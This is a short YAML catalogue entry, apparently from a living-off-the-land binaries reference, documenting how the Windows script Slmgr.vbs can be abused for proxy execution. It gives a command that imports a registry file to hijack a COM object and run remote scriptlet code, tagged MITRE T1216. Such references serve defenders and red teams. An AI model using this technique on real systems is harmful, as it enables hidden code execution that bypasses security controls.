---
name: Slmgr.vbs
description: Script used to manage windows license activation
functions:
  execute:
    - description: Hijack the Scripting.Dictionary COM Object to execute remote scriptlet (SCT) code
      code: reg.exe import c:\path\to\Slmgr.reg & cscript.exe /b c:\windows\system32\slmgr.vbs
      mitreid: T1216
      mitrelink: https://attack.mitre.org/wiki/Technique/T1216
      operatingsystem: Windows 10
      privileges: User
      usecase: Proxy execution
resources:
    - resource: https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology
    - resource: https://www.youtube.com/watch?v=3gz1QmiMhss
fullpath:
    - path: C:\Windows\System32\slmgr.vbs
    - path: C:\Windows\SysWOW64\slmgr.vbs
detection:
  - IOC: 
acknowledgement:
  - Person: Matt Nelson
    Handle: '@enigma0x3'
  - Person: Casey Smith
    Handle: '@subtee'
---
